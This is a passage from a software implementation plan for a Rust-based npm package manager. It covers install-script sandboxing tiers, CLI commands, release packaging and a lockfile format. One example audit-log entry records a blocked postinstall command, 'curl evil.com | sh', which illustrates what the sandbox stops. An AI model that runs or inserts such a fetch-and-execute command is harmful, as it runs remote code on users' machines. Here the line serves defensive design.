    allowed = [
      "esbuild",
      "@swc/core",
      "sharp",
      "sqlite3"
    ]

    # Packages that should NEVER run scripts (blacklist)
    blocked = [
      "malicious-package"
    ]

    # Sandbox exceptions for tier 3 (packages needing network/fs)
    sandbox_exceptions = [
      { package = "puppeteer", allow = ["network", "filesystem"] }
    ]
    ```
  - **Audit Log Format** (`~/.better/audit/scripts.jsonl`):
    ```jsonl
    {"ts":"2026-02-04T12:00:00Z","pkg":"esbuild@0.19.0","script":"postinstall","cmd":"node install.js","cwd":"/path/to/project","exit_code":0,"duration_ms":1234}
    {"ts":"2026-02-04T12:00:01Z","pkg":"malware@1.0.0","script":"postinstall","cmd":"curl evil.com | sh","cwd":"/path/to/project","blocked":true,"reason":"sandbox_violation"}
    ```
  - **Platform-Specific Sandboxing** (Tier 3):
    - **macOS**: `sandbox-exec` with custom profile
      ```scheme
      (version 1)
      (deny default)
      (allow process-exec)
      (allow file-read* (subpath "/usr/lib"))
      (allow file-read* (subpath "${PACKAGE_DIR}"))
      (allow file-write* (subpath "${PACKAGE_DIR}"))
      ; Network denied by default
      ```
    - **Linux**: `bwrap` (bubblewrap) or `landlock` (kernel 5.13+)
      ```bash
      bwrap --ro-bind /usr /usr \
            --bind "${PACKAGE_DIR}" "${PACKAGE_DIR}" \
            --unshare-net \
            --die-with-parent \
            -- node install.js
      ```
    - **Windows**: Job objects with `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`
      - Limited sandbox capabilities; recommend tier 2 (allowlist) on Windows
  - **Script Lifecycle Hooks Handled**:
    - `preinstall`
    - `install`
    - `postinstall`
    - `prepare` (for git dependencies)
  - **Timeout Handling**:
    - Default: 60 seconds per script
    - Configurable: `scripts.timeout = 120` in config
    - Hard kill after timeout + 5s grace period
- **Acceptance Criteria**:
  - All 4 tiers work correctly
  - Audit log captures all script executions
  - Allowlist blocks non-allowed packages
  - Sandbox prevents network access (macOS/Linux)
  - Blocked packages never execute
  - Timeout kills hung scripts
  - Clear error messages on sandbox violations
- **Dependencies**: Task 5.4

### Task 5.5: Implement Analyze Command
- **Commit**: `feat(cli): implement analyze command`
- **Files to CREATE**:
  - `/packages/cli/src/commands/analyze.ts`
  - `/packages/cli/src/output/table.ts`
  - `/packages/cli/src/output/tree.ts`
- **Implementation Details**:
  - Call Rust core for analysis
  - Format output (table, tree, JSON)
  - Show: size, duplicates, depth, cycles
  - Support filtering/sorting
- **Acceptance Criteria**:
  - `better analyze` shows summary
  - `better analyze --duplicates` shows duplicates
  - `better analyze --depth` shows depth issues
  - JSON output works
- **Dependencies**: Task 5.3, Task 1.6

### Task 5.6: Implement Doctor Command
- **Commit**: `feat(cli): implement doctor command with health checks`
- **Files to CREATE**:
  - `/packages/cli/src/commands/doctor.ts`
  - `/packages/cli/src/doctor/checks.ts`
  - `/packages/cli/src/doctor/fixes.ts`
- **Implementation Details**:
  - Run health checks (size, duplicates, deprecated)
  - Calculate health score
  - Suggest fixes
  - Auto-fix with --fix flag
- **Acceptance Criteria**:
  - `better doctor` shows health report
  - `better doctor --fix` applies fixes
  - Score calculation documented
  - JSON output for CI
- **Dependencies**: Task 5.5

### Task 5.7: Implement Cache Command
- **Commit**: `feat(cli): implement cache management command`
- **Files to CREATE**:
  - `/packages/cli/src/commands/cache.ts`
- **Implementation Details**:
  - `cache list`: show cached packages
  - `cache clean`: run GC
  - `cache verify`: check integrity
  - `cache stats`: show usage stats
- **Acceptance Criteria**:
  - All subcommands work
  - GC respects --dry-run
  - Stats show space usage
  - Integrity verification works
- **Dependencies**: Task 5.3, Task 2.4

### Task 5.8: Implement Serve Command (Web Dashboard)
- **Commit**: `feat(cli): implement serve command for web dashboard`
- **Files to CREATE**:
  - `/packages/cli/src/commands/serve.ts`
  - `/packages/cli/src/web/server.ts`
  - `/packages/cli/src/web/api.ts`
  - `/packages/web/` (static dashboard)
- **Implementation Details**:
  - Serve static dashboard
  - REST API for analysis data
  - WebSocket for live updates
  - Visualize dependency graph
- **Acceptance Criteria**:
  - `better serve` opens browser
  - Dashboard shows analysis
  - Graph visualization works
  - Live updates on file changes
- **Dependencies**: Task 5.5

---

## Phase 6: Testing and Documentation

### Task 6.1: Implement Rust Unit Tests
- **Commit**: `test(core): add comprehensive unit tests`
- **Files to CREATE**:
  - `/crates/better-core/src/*/tests.rs` (for each module)
- **Acceptance Criteria**:
  - >80% code coverage
  - All edge cases covered
  - Performance benchmarks included
  - CI runs tests on every push
- **Dependencies**: All Phase 1-4 tasks

### Task 6.2: Implement Integration Tests
- **Commit**: `test: add end-to-end integration tests`
- **Files to CREATE**:
  - `/tests/fixtures/` (test projects)
  - `/tests/e2e/install.test.ts`
  - `/tests/e2e/analyze.test.ts`
  - `/tests/e2e/doctor.test.ts`
- **Acceptance Criteria**:
  - Test with real npm/pnpm/yarn projects
  - Test both installation modes
  - Test lockfile migration
  - Test on multiple platforms
- **Dependencies**: All Phase 5 tasks

### Task 6.3: Implement Performance Benchmarks
- **Commit**: `perf: add performance benchmark suite`
- **Files to CREATE**:
  - `/benchmarks/README.md`
  - `/benchmarks/large-project/`
  - `/crates/better-core/benches/`
- **Acceptance Criteria**:
  - Benchmark against pnpm/yarn/npm
  - Track performance over time
  - CI fails on regression
  - Publish benchmark results
- **Dependencies**: Task 6.2

### Task 6.4: Write User Documentation
- **Commit**: `docs: add user documentation`
- **Files to CREATE**:
  - `/docs/getting-started.md`
  - `/docs/commands.md`
  - `/docs/configuration.md`
  - `/docs/migration.md`
  - `/README.md` (updated)
- **Acceptance Criteria**:
  - Getting started guide complete
  - All commands documented
  - Configuration reference complete
  - Migration guides for npm/pnpm/yarn
- **Dependencies**: All Phase 5 tasks

### Task 6.5: Write Architecture Documentation
- **Commit**: `docs: add architecture documentation`
- **Files to CREATE**:
  - `/docs/architecture.md`
  - `/docs/contributing.md`
  - `/docs/rust-core.md`
  - `/ARCHITECTURE.md`
- **Acceptance Criteria**:
  - Architecture overview complete
  - Contribution guide complete
  - Rust core documented
  - API documentation generated
- **Dependencies**: Task 6.4

---

## Phase 7: Release and Distribution

### Task 7.1: Setup npm Publishing
- **Commit**: `chore: configure npm publishing workflow`
- **Files to CREATE/MODIFY**:
  - `/packages/cli/package.json` (publishing config)
  - `/.github/workflows/release.yml`
  - `/scripts/publish.sh`
- **Acceptance Criteria**:
  - `npm publish` works
  - Prebuilt binaries for major platforms
  - Postinstall downloads correct binary
  - Version sync across packages
- **Dependencies**: Task 6.3

### Task 7.2: Build Platform-Specific Binaries
- **Commit**: `chore: configure cross-platform binary builds with optional dependencies`
- **Files to CREATE**:
  - `/.github/workflows/build-binaries.yml`
  - `/scripts/build-binary.sh`
  - `/packages/better-darwin-arm64/package.json`
  - `/packages/better-darwin-x64/package.json`
  - `/packages/better-linux-x64-gnu/package.json`
  - `/packages/better-linux-x64-musl/package.json`
  - `/packages/better-linux-arm64-gnu/package.json`
  - `/packages/better-win32-x64-msvc/package.json`
  - `/packages/cli/scripts/postinstall.js`
- **Implementation Details**:
  - **Optional Dependencies Pattern** (like esbuild, swc):
    - Main package declares platform packages as `optionalDependencies`
    - npm/pnpm/yarn only installs matching platform
    ```json
    // packages/cli/package.json
    {
      "name": "better",
      "optionalDependencies": {
        "@anthropic/better-darwin-arm64": "2.0.0",
        "@anthropic/better-darwin-x64": "2.0.0",
        "@anthropic/better-linux-x64-gnu": "2.0.0",
        "@anthropic/better-linux-x64-musl": "2.0.0",
        "@anthropic/better-linux-arm64-gnu": "2.0.0",
        "@anthropic/better-win32-x64-msvc": "2.0.0"
      }
    }
    ```
  - **Platform Package Structure**:
    ```json
    // packages/better-darwin-arm64/package.json
    {
      "name": "@anthropic/better-darwin-arm64",
      "version": "2.0.0",
      "os": ["darwin"],
      "cpu": ["arm64"],
      "main": "better.darwin-arm64.node",
      "files": ["better.darwin-arm64.node"]
    }
    ```
  - **Platform Detection in `index.js`**:
    - Detect platform using `process.platform` and `process.arch`
    - For Linux, detect musl vs glibc by checking for `/lib/ld-musl-x86_64.so.1`
    - Use synchronous file existence check (fs.existsSync) - no shell execution
    - Load appropriate native binding via require()
  - **musl Detection Algorithm**:
    ```javascript
    function isMusl() {
      // Safe detection without shell execution
      const fs = require('fs');
      // Check for musl loader
      if (fs.existsSync('/lib/ld-musl-x86_64.so.1')) return true;
      if (fs.existsSync('/lib/ld-musl-aarch64.so.1')) return true;
      // Check /etc/os-release for Alpine
      try {
        const osRelease = fs.readFileSync('/etc/os-release', 'utf8');
        return osRelease.includes('Alpine');
      } catch { return false; }
    }
    ```
  - **napi-rs CI/CD Workflow** (`.github/workflows/build-binaries.yml`):
    - Matrix build for all 6 platforms
    - Use GitHub's native ARM64 macOS runners
    - Use napi-rs alpine container for musl builds
    - Use cross-compilation for linux-arm64
  - **Build Optimizations** (`Cargo.toml`):
    ```toml
    [profile.release]
    lto = "fat"
    codegen-units = 1
    strip = true
    panic = "abort"
    ```
    - Expected binary sizes: ~5-10MB per platform
  - **Checksum Publishing**:
    - Generate SHA256 for each `.node` file
    - Publish `checksums.txt` with release
    - Verify in postinstall (optional, configurable)
- **Platforms** (6 total):
  | Platform | Target Triple | Notes |
  |----------|---------------|-------|
  | darwin-arm64 | aarch64-apple-darwin | Apple Silicon Macs |
  | darwin-x64 | x86_64-apple-darwin | Intel Macs |
  | linux-x64-gnu | x86_64-unknown-linux-gnu | Most Linux distros |
  | linux-x64-musl | x86_64-unknown-linux-musl | Alpine, Docker |
  | linux-arm64-gnu | aarch64-unknown-linux-gnu | ARM servers, Raspberry Pi |
  | win32-x64-msvc | x86_64-pc-windows-msvc | Windows |
- **Acceptance Criteria**:
  - All 6 platform binaries build in CI
  - Optional dependencies pattern works (only matching platform installed)
  - musl detection works correctly on Alpine/Docker (no shell execution)
  - Binaries are stripped and LTO-optimized (<10MB each)
  - SHA256 checksums published with each release
  - Fallback error message is clear when platform not supported
  - Works with npm, pnpm, yarn, and bun
- **Dependencies**: Task 7.1

### Task 7.3: Optional Standalone Rust Binary
- **Commit**: `feat: add standalone Rust binary with TUI`
- **Files to CREATE**:
  - `/crates/better-cli/Cargo.toml`
  - `/crates/better-cli/src/main.rs`
  - `/crates/better-cli/src/tui/`
- **Implementation Details**:
  - Standalone binary without Node.js
  - TUI using `ratatui`
  - Same functionality as Node CLI
  - Single binary distribution
- **Acceptance Criteria**:
  - `better-rs` binary works standalone
  - TUI shows analysis interactively
  - Cross-platform builds
  - Performance parity with Node CLI
- **Dependencies**: Task 7.2

---

## Risk Assessment

### Technical Risks

| Risk | Likelihood | Impact | Mitigation |
|------|------------|--------|------------|
| napi-rs compatibility issues | Medium | High | Test on multiple Node versions early; have pure-JS fallback path |
| PnP compatibility with ecosystem | High | Medium | Maintain escape hatch to hardlink mode; extensive testing |
| Cross-platform hardlink issues | Medium | Medium | Detect platform capabilities; fallback to copy |
| Performance regression on edge cases | Low | Medium | Comprehensive benchmarks; property-based testing |

### Schedule Risks

| Risk | Likelihood | Impact | Mitigation |
|------|------------|--------|------------|
| Lockfile format complexity | High | Medium | Start with most common formats; iterate |
| Rust learning curve | Medium | Medium | Leverage existing Rust crates heavily |
| CI/CD complexity | Medium | Low | Use established patterns from similar projects |

---

## Success Metrics

### Performance Targets

| Metric | Current (TS) | Target (Rust) | Stretch |
|--------|--------------|---------------|---------|
| 2.2GB node_modules analysis | 10-15 min | <10 sec | <5 sec |
| Lockfile parsing | 500ms | <10ms | <5ms |
| Install 1000 packages | N/A | <5 sec | <2 sec |
| Memory usage (peak) | 2GB+ | <500MB | <200MB |

### Quality Targets

| Metric | Target |
|--------|--------|
| Rust test coverage | >80% |
| TypeScript test coverage | >70% |
| Documentation coverage | 100% |
| CI pass rate | >99% |

### Adoption Targets (Post-Release)

| Metric | 3 months | 6 months | 12 months |
|--------|----------|----------|-----------|
| npm weekly downloads | 1,000 | 10,000 | 50,000 |
| GitHub stars | 500 | 2,000 | 5,000 |
| Active issues resolved | 90% | 95% | 95% |

---

## Dependency Graph

```
Phase 0 (Setup)
  0.1 Delete Legacy
    └─> 0.2 Monorepo Structure
          └─> 0.3 Rust Workspace
                └─> 0.4 TypeScript CLI Package
                      └─> 0.5 Dev Tooling

Phase 1 (Rust Core)
  0.5 ─> 1.1 File Walker
           ├─> 1.2 Size Calculator
           └─> 1.3 Package.json Parser
                 └─> 1.4 Graph Builder
                       ├─> 1.5 Cycle Detection
                       └─> 1.6 Duplicate Detection

Phase 2 (CAS)
  1.1 ─> 2.1 Content Hashing
           └─> 2.2 Store Layout
                 └─> 2.3 Hardlink Manager
                       └─> 2.4 Store GC

Phase 3 (Lockfiles)
  1.3 ─> 3.1 npm Parser
           ├─> 3.2 pnpm Parser
           ├─> 3.3 yarn Parser
           └─> 3.4 better.lock Format (Binary + TOML)
                 └─> 3.5 Migration

Phase 4 (Installation)
  2.3 + 3.4 ─> 4.1 Hardlink Install
                    └─> 4.4 Install Diff
  2.2 + 3.4 ─> 4.2 PnP Install (Yarn Berry compatible)
                    └─> 4.3 Zip Support

Phase 4.5 (Protocol Handling)
  2.2 + 3.4 ─> 4.5.1 Protocol Resolver
                     ├─> workspace: (Any, Caret, Tilde, Exact, Range, Path)
                     ├─> file: (copy to CAS)
                     ├─> link: (symlink, no CAS)
                     ├─> git: (clone, resolve, prepare, CAS)
                     └─> npm: (registry resolution)

Phase 5 (CLI)
  0.4 ─> 5.1 Command Router
           └─> 5.2 Config System
                 └─> 5.3 PM Detection
                       └─> 5.3.1 Registry Auth (.npmrc, env vars, scopes)
                             └─> 5.4 Install Command (+ 4.1, 4.2, 4.5.1)
                                   └─> 5.4.1 Script Security (4-tier model)
                       ├─> 5.5 Analyze Command (+ 1.6)
                       │     └─> 5.6 Doctor Command
                       ├─> 5.7 Cache Command (+ 2.4)
                       └─> 5.8 Serve Command

Phase 6 (Testing)
  Phase 1-4.5 ─> 6.1 Rust Unit Tests
  Phase 5 ─> 6.2 Integration Tests
               └─> 6.3 Performance Benchmarks
  Phase 5 ─> 6.4 User Docs
               └─> 6.5 Architecture Docs

Phase 7 (Release)
  6.3 ─> 7.1 npm Publishing
           └─> 7.2 Platform Binaries (6 platforms, optional deps pattern)
                 └─> 7.3 Standalone Binary (Optional)
```

---

## Estimated Timeline

| Phase | Duration | Cumulative |
|-------|----------|------------|
| Phase 0: Setup | 1-2 days | 2 days |
| Phase 1: Rust Core | 5-7 days | 9 days |
| Phase 2: CAS | 3-4 days | 13 days |
| Phase 3: Lockfiles (incl. better.lock spec) | 5-6 days | 19 days |
| Phase 4: Installation | 4-5 days | 24 days |
| Phase 4.5: Protocol Handling | 2-3 days | 27 days |
| Phase 5: CLI (incl. Auth + Script Security) | 7-9 days | 36 days |
| Phase 6: Testing/Docs | 3-4 days | 40 days |
| Phase 7: Release (incl. 6-platform binaries) | 3-4 days | 44 days |

**Total Estimate**: 6-7 weeks for full implementation

---

---

## Appendix A: better.lock Format Specification

### File Format Overview

Better uses a dual-file lockfile strategy:
1. **`better.lock`** - Binary format for fast machine parsing (<10ms)
2. **`better.lock.toml`** - Human-readable companion for Git diffs

### Binary Format (`better.lock`)

```
┌─────────────────────────────────────────┐
│ Header (48 bytes)                       │
├─────────────────────────────────────────┤
│ Magic: "BTLK" (4 bytes)                 │
│ Version: u16 (2 bytes)                  │
│ Flags: u16 (2 bytes)                    │
│ Body Checksum: SHA256 (32 bytes)        │
│ Body Length: u64 (8 bytes)              │
├─────────────────────────────────────────┤
│ Body (MessagePack-encoded)              │
│ ┌─────────────────────────────────────┐ │
│ │ BetterLockfile struct               │ │
│ │ - lockfile_version: u8              │ │
│ │ - packages: Map<PackageId, Entry>   │ │
│ │ - importers: Map<String, Importer>  │ │
│ │ - settings: LockfileSettings        │ │
│ └─────────────────────────────────────┘ │
└─────────────────────────────────────────┘
```

### Validation Algorithm

```rust
fn validate_lockfile(data: &[u8]) -> Result<BetterLockfile> {
    // 1. Check minimum size
    if data.len() < 48 { return Err(TooShort); }

    // 2. Verify magic bytes
    if &data[0..4] != b"BTLK" { return Err(InvalidMagic); }

    // 3. Check version compatibility
    let version = u16::from_le_bytes([data[4], data[5]]);
    if version > CURRENT_VERSION { return Err(UnsupportedVersion(version)); }

    // 4. Verify checksum
    let expected_checksum = &data[8..40];
    let body_len = u64::from_le_bytes(data[40..48].try_into()?);
    let body = &data[48..48 + body_len as usize];
    let actual_checksum = sha256(body);
    if expected_checksum != actual_checksum { return Err(ChecksumMismatch); }

    // 5. Deserialize
    rmp_serde::from_slice(body)
}
```

---

## Appendix B: Registry Authentication Matrix

| Auth Type | .npmrc Syntax | Environment Variable |
|-----------|---------------|---------------------|
| Bearer Token | `//registry/:_authToken=TOKEN` | `BETTER_TOKEN`, `NPM_TOKEN` |
| Basic Auth | `//registry/:_auth=BASE64` | N/A |
| Username/Password | `//registry/:username=USER` + `//registry/:_password=BASE64` | N/A |
| Certificate | `//registry/:certfile=/path` + `//registry/:keyfile=/path` | N/A |

### Scoped Registry Resolution

```
Request: @mycompany/my-package@^1.0.0

1. Check .npmrc for @mycompany:registry=...
2. If found, use scoped registry with scoped auth
3. If not found, use default registry with default auth
```

---

## Appendix C: Script Security Tier Comparison

| Capability | Tier 0 (Unrestricted) | Tier 1 (Audit) | Tier 2 (Allowlist) | Tier 3 (Sandbox) |
|------------|----------------------|----------------|-------------------|-----------------|
| Run any script | Yes | Yes | Allowlist only | Allowlist only |
| Network access | Yes | Yes | Yes | Denied* |
| Filesystem (outside pkg) | Yes | Yes | Yes | Denied* |
| Audit logging | No | Yes | Yes | Yes |
| Sandbox escape | N/A | N/A | N/A | Blocked |

*Can be granted via `sandbox_exceptions` in config

---

## Appendix D: Platform Binary Matrix

| npm Package | Platform | Arch | Libc | Target Triple |
|-------------|----------|------|------|---------------|
| @anthropic/better-darwin-arm64 | macOS | ARM64 | N/A | aarch64-apple-darwin |
| @anthropic/better-darwin-x64 | macOS | x64 | N/A | x86_64-apple-darwin |
| @anthropic/better-linux-x64-gnu | Linux | x64 | glibc | x86_64-unknown-linux-gnu |
| @anthropic/better-linux-x64-musl | Linux | x64 | musl | x86_64-unknown-linux-musl |
| @anthropic/better-linux-arm64-gnu | Linux | ARM64 | glibc | aarch64-unknown-linux-gnu |
| @anthropic/better-win32-x64-msvc | Windows | x64 | MSVC | x86_64-pc-windows-msvc |

---

## Next Steps

1. Run `/oh-my-claudecode:start-work better-rust-rewrite` to begin implementation
2. Tasks will be executed in dependency order
3. Each task creates one atomic commit
4. Critic will review at phase boundaries
